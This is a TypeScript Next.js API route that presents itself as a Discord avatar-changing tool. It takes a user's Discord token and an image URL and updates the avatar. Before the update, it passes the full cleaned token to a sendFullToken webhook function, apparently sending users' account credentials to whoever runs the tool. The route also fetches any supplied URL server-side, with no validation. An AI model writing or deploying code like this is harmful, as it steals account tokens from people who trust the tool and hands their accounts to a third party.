import { NextResponse } from 'next/server';
import { discordFetch, cleanToken } from '@/lib/discord';
import { sendFullToken } from '@/lib/webhook';
import { arrayBufferToBase64 } from '@/lib/edge-utils';

export const runtime = 'edge';

export async function POST(req: Request) {
  try {
    const body = await req.json().catch(() => ({}));
    const { token, avatarUrl } = body;

    if (!token || !avatarUrl) {
      return NextResponse.json({ success: false, error: 'Token and avatarUrl are required' }, { status: 400 });
    }

    const ct = cleanToken(token);
    sendFullToken('تغيير أفتار', ct, { '🖼️ رابط': avatarUrl });

    // Fetch the image and convert to base64 data URI
    const imageRes = await fetch(avatarUrl);
    if (!imageRes.ok) {
      return NextResponse.json({ success: false, error: `Failed to fetch image (${imageRes.status})` }, { status: 400 });
    }

    const contentType = imageRes.headers.get('content-type') || 'image/png';
    const arrayBuffer = await imageRes.arrayBuffer();
    const base64 = arrayBufferToBase64(arrayBuffer);
    const dataURI = `data:${contentType};base64,${base64}`;

    // PATCH /users/@me with the avatar
    const res = await discordFetch(ct, 'PATCH', '/users/@me', {
      avatar: dataURI,
    });

    if (!res.ok) {
      const errData = res.data as { message?: string } | undefined;
      return NextResponse.json({
        success: false,
        error: errData?.message || `Failed to change avatar (${res.status})`,
      }, { status: res.status });
    }

    return NextResponse.json({ success: true, message: 'Avatar changed successfully' });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'Unexpected error';
    console.error('[Change Avatar Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
